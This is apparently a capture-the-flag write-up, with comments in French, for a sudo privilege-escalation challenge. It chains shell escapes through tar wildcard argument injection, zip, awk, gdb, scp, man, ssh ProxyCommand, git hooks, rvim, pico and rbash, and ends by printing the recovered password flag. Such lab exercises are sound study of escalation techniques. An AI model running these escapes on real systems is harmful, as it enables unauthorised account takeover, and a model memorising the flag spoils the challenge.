1] [vim]
	:set shell=/bin/bash
	:shell
	=> /usr/bin/sudo : (app-script-ch14-2) NOPASSWD: /usr/bin/python

2] [python]
	/usr/bin/sudo -u app-script-ch14-2 /usr/bin/python -c 'import os; os.system("/usr/bin/sudo -l")'
	=> (app-script-ch14-3) NOPASSWD: /bin/tar

3] [tar]
	/usr/bin/sudo -u app-script-ch14-2 /usr/bin/python -c 'import os; os.system("mkdir /tmp/JLQAHUBUFONUQTK; chmod 777 /tmp/JLQAHUBUFONUQTK; echo okok>/tmp/JLQAHUBUFONUQTK/--checkpoint=1; echo okok>/tmp/JLQAHUBUFONUQTK/--checkpoint-action=exec=sh; cd /tmp/JLQAHUBUFONUQTK;touch loli; /usr/bin/sudo -u app-script-ch14-3 tar -cvf lol.tar *")'
	=> (app-script-ch14-4) NOPASSWD: /usr/bin/zip

4] [zip]
	/usr/bin/sudo -u app-script-ch14-2 /usr/bin/python -c 'import os; os.system("mkdir /tmp/LNMXRCESNQRXFKN; chmod 777 /tmp/LNMXRCESNQRXFKN; echo okok>/tmp/LNMXRCESNQRXFKN/--checkpoint=1; echo okok>/tmp/LNMXRCESNQRXFKN/--checkpoint-action=exec=sh; cd /tmp/LNMXRCESNQRXFKN;touch loli; /usr/bin/sudo -u app-script-ch14-3 tar -cvf lol.tar *")'
	/usr/bin/sudo -u app-script-ch14-4 zip lol.zip lol.tar -T -TT 'sh; echo aa; echo bbb'
	=> (app-script-ch14-5) NOPASSWD: /usr/bin/awk

5] [awk]
	/usr/bin/sudo -u app-script-ch14-2 /usr/bin/python -c 'import os; os.system("mkdir /tmp/LNMXRCESNQRXFKN; chmod 777 /tmp/LNMXRCESNQRXFKN; echo okok>/tmp/LNMXRCESNQRXFKN/--checkpoint=1; echo okok>/tmp/LNMXRCESNQRXFKN/--checkpoint-action=exec=sh; cd /tmp/LNMXRCESNQRXFKN;touch loli; /usr/bin/sudo -u app-script-ch14-3 tar -cvf lol.tar *")'
	/usr/bin/sudo -u app-script-ch14-4 zip lol.zip lol.tar -T -TT 'sh; echo aa; echo bbb'
	sudo -u app-script-ch14-5 awk 'BEGIN {system("echo sudo -l | /bin/sh")}'
	=> (app-script-ch14-6) NOPASSWD: /usr/bin/gdb

6] [gdb]
	/usr/bin/sudo -u app-script-ch14-2 /usr/bin/python -c 'import os; os.system("mkdir /tmp/LNMXRCESNQRXFKN; chmod 777 /tmp/LNMXRCESNQRXFKN; echo okok>/tmp/LNMXRCESNQRXFKN/--checkpoint=1; echo okok>/tmp/LNMXRCESNQRXFKN/--checkpoint-action=exec=sh; cd /tmp/LNMXRCESNQRXFKN;touch loli; /usr/bin/sudo -u app-script-ch14-3 tar -cvf lol.tar *")'
	/usr/bin/sudo -u app-script-ch14-4 zip lol.zip lol.tar -T -TT 'sh; echo aa; echo bbb'
	sudo -u app-script-ch14-5 awk 'BEGIN {system("/bin/sh")}'
	sudo -u app-script-ch14-6 /usr/bin/gdb /bin/sh
	r
	sudo -l
	=> (app-script-ch14-7) NOPASSWD: /usr/bin/script

7] [script]
	/usr/bin/sudo -u app-script-ch14-2 /usr/bin/python -c 'import os; os.system("mkdir /tmp/LNMXRCESNQRXFKN; chmod 777 /tmp/LNMXRCESNQRXFKN; echo okok>/tmp/LNMXRCESNQRXFKN/--checkpoint=1; echo okok>/tmp/LNMXRCESNQRXFKN/--checkpoint-action=exec=sh; cd /tmp/LNMXRCESNQRXFKN;touch loli; /usr/bin/sudo -u app-script-ch14-3 tar -cvf lol.tar *")'
	/usr/bin/sudo -u app-script-ch14-4 zip lol.zip lol.tar -T -TT 'sh; echo aa; echo bbb'
	sudo -u app-script-ch14-5 awk 'BEGIN {system("/bin/sh")}'
	sudo -u app-script-ch14-6 /usr/bin/gdb /bin/sh
	r
	sudo -u app-script-ch14-7 /usr/bin/script -c "sudo -l"
	=> (app-script-ch14-7) NOPASSWD: /usr/bin/scp

8] [scp]
	(création du dossier kookiko + upload du fichier open_bin_sh_with_rights.c dans /tmp/kookiko/exploit.c + chmod)

	/usr/bin/sudo -u app-script-ch14-2 /usr/bin/python -c 'import os; os.system("mkdir /tmp/LNMXRCESNQRXFKN; chmod 777 /tmp/LNMXRCESNQRXFKN; echo okok>/tmp/LNMXRCESNQRXFKN/--checkpoint=1; echo okok>/tmp/LNMXRCESNQRXFKN/--checkpoint-action=exec=sh; cd /tmp/LNMXRCESNQRXFKN;touch loli; /usr/bin/sudo -u app-script-ch14-3 tar -cvf lol.tar *")'
	/usr/bin/sudo -u app-script-ch14-4 zip lol.zip lol.tar -T -TT 'sh; echo aa; echo bbb'
	sudo -u app-script-ch14-5 awk 'BEGIN {system("/bin/sh")}'
	sudo -u app-script-ch14-6 /usr/bin/gdb /bin/sh
	r
	echo 'sudo -l>res' > thescript.sh
	sudo -u app-script-ch14-7 /usr/bin/script
	sudo -u app-script-ch14-8 /usr/bin/scp -S /tmp/kookiko/exploit a@b:lol ici
	cat res
	=> (app-script-ch14-9) NOPASSWD: /usr/bin/man

9] [man]
	(création du dossier kookiko + upload du fichier script_open_shell.sh + chmod)
	(man_script contient le nouveau script (sudo -l))

	/usr/bin/sudo -u app-script-ch14-2 /usr/bin/python -c 'import os; os.system("mkdir /tmp/LNMXRCESNQRXFKN; chmod 777 /tmp/LNMXRCESNQRXFKN; echo okok>/tmp/LNMXRCESNQRXFKN/--checkpoint=1; echo okok>/tmp/LNMXRCESNQRXFKN/--checkpoint-action=exec=sh; cd /tmp/LNMXRCESNQRXFKN;touch loli; /usr/bin/sudo -u app-script-ch14-3 tar -cvf lol.tar *")'
	/usr/bin/sudo -u app-script-ch14-4 zip lol.zip lol.tar -T -TT 'sh; echo aa; echo bbb'
	sudo -u app-script-ch14-5 awk 'BEGIN {system("/bin/sh")}'
	sudo -u app-script-ch14-6 /usr/bin/gdb /bin/sh
	r
	sudo -u app-script-ch14-7 /usr/bin/script
	sudo -u app-script-ch14-8 /usr/bin/scp -S /tmp/kookiko/script_open_shell.sh a@b:lol ici
	./basic_shell_owned
	sudo -u app-script-ch14-9 /usr/bin/man --pager=/tmp/kookiko/man_script.sh man
	=> (app-script-ch14-10) NOPASSWD: /usr/bin/ssh

10] [ssh]
	(on répète les opérations précédentes dans un autre dossier pour avoir à nouveau un shell avec app-script-ch14-9)
	sudo -u app-script-ch14-10 ssh -o 'ProxyCommand /tmp/kookiko/script.sh' a@b
	=> (app-script-ch14-11) NOPASSWD: /usr/bin/git

11] [git]
	(on répète les opérations précédentes dans un autre dossier pour avoir à nouveau un shell avec app-script-ch14-10)
	git init
	nano .git/hooks/commit-msg #y mettre le script actuel
	chmod -R 777 .git
	echo aa>bb
	git stage .
	sudo -u app-script-ch14-11 git commit -m "lol"
	(app-script-ch14-12) NOPASSWD: /usr/bin/rvim

12] [rvim]
	(on répète les opérations pérécédentes dans un autre dossier pour avoir à nouveau un shell avec app-script-ch14-11)
	sudo -u app-script-ch14-12 rvim
	:python import os; open('script5.sh', 'wb').write(open('script4.sh','rb').read().replace('access4','access5')); os.system("chmod 777 script5.sh; ./script5.sh")
	(app-script-ch14-13) NOPASSWD: /usr/bin/pico

13] [pico]
	(on répète les opérations pérécédentes dans un autre dossier pour avoir à nouveau un shell avec app-script-ch14-12)
	sudo -u app-script-ch14-13 /usr/bin/pico -s /tmp/kookiko/script6.sh
	Puis on écrite un truc et on fait CTRL-T.
	(app-script-ch14-13) NOPASSWD: /bin/rbash --

14] [rbash]
	(on répète les opérations pérécédentes dans un autre dossier pour avoir à nouveau un shell avec app-script-ch14-13)
	echo "cat /challenge/app-script/ch14/.passwd" > script_final
	sudo -u app-script-ch14-13 rbash -- < script_final
	3sc@p3_G@m3s_@r3_R34lly_Fun!!
